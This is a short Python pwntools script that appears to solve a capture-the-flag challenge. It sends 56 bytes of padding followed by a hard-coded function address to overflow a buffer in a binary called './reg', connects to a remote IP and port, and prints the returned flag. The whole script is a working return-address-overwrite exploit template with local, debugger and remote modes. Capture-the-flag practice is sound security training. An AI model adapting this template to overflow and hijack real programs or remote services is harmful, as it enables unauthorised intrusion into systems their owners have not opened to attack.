from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
#b *0x0006a78b
continue
'''.format(**locals())

# Binary filename
exe = './reg'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
#offset = find_ip(cyclic(500))
padding = 'A' * 56
# Start program
#io = start()
#io= process()
io= remote('94.237.59.63', '53311')
# Build the payload
winadd= int('0x0000000000401206' ,16)

payload = flat(
    [ padding,
      winadd
      

    ]
)
io.sendlineafter(b'Enter your name : ', payload)

# Save the payload to file
# write('payload', payload)

# Got Shell?
#io.interactive()

# Or, Get our flag!
flag = io.recv()
success(flag)
